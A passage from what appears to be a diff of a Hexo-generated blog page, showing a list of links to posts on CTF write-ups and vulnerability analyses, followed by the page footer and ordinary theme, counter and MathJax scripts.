class="post-list-item"><a class="post-list-link" href="/2017/03/14/0x2d/">栈溢出之绕过CANARY保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/06/0x2a/">CVE-2016-6313 随机数预测分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/0x29/">phpmailer RCE 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/0x28/">2016 HCTF Crypto 出题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/0x24/">HITCON 2016 Web 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/12/0x23/">2016 HITCON Crypto -- PAKE(++)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分Web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 4;
+                var backgroundimg = "url(http://qn.lazysheep.cc/bg/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
